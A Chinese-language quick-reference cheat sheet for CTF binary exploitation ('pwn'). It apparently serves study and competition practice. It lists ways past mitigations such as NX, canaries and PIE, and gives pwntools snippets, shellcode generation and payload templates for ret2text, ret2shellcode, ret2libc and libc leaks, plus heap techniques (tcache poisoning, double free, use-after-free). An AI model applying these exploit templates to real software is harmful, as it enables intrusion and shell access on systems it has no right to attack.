# PWN 快速参考

## 保护机制检查

```bash
checksec ./pwn
```

| 保护 | 开启 | 绕过方法 |
|------|------|----------|
| NX | 栈不可执行 | ret2libc, ROP |
| Canary | 栈保护 | 泄露, 格式化字符串 |
| PIE | 地址随机 | 泄露基址 |
| RELRO | GOT 保护 | Partial 可写 GOT |

## 偏移计算

```bash
# 生成 pattern
cyclic 200

# 计算偏移
cyclic -l 0x61616168
```

## 常用 pwntools

```python
from pwn import *

# 连接
io = process('./pwn')
io = remote('ip', port)

# 发送接收
io.send(data)
io.sendline(data)
io.sendafter(b'>', data)
io.recv(n)
io.recvline()
io.recvuntil(b'>')

# 打包解包
p32(0x12345678)  # 32位小端
p64(0x12345678)  # 64位小端
u32(b'\x78\x56\x34\x12')
u64(data.ljust(8, b'\x00'))

# ELF 操作
elf = ELF('./pwn')
elf.symbols['main']
elf.plt['puts']
elf.got['puts']
next(elf.search(b'/bin/sh'))

# ROP
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.chain()

# Shellcode
shellcode = asm(shellcraft.sh())

# 格式化字符串
fmtstr_payload(offset, {addr: value})
```

## 利用模式速查

### ret2text
```python
payload = b'A' * offset + p64(backdoor)
```

### ret2shellcode
```python
payload = shellcode.ljust(offset, b'A') + p64(buf_addr)
```

### ret2libc (32位)
```python
payload = b'A' * offset
payload += p32(system)
payload += p32(0)
payload += p32(binsh)
```

### ret2libc (64位)
```python
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)  # 栈对齐
payload += p64(system)
```

### 泄露 libc
```python
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(main)
```

## Gadget 查找

```bash
ROPgadget --binary ./pwn --only "pop|ret"
ROPgadget --binary ./pwn | grep "pop rdi"
one_gadget ./libc.so.6
```

## GDB 常用命令

```bash
b *main          # 断点
r                # 运行
ni/si            # 单步
c                # 继续
x/20gx $rsp      # 查看内存
vmmap            # 内存映射 (pwndbg)
heap             # 堆状态 (pwndbg)
bins             # bins 状态 (pwndbg)
```

## Libc 版本识别

- https://libc.blukat.me/
- https://libc.rip/

## 堆利用速查

### Tcache Poisoning
```python
delete(0)
edit(0, p64(target))
add()  # chunk 0
add()  # target
```

### Double Free (tcache)
```python
delete(0)
delete(0)
add()
edit(0, p64(target))
add()
add()  # target
```

### UAF
```python
add()   # 0
delete(0)
add()   # 1, 复用 0 的内存
# 0 和 1 指向同一块内存
```
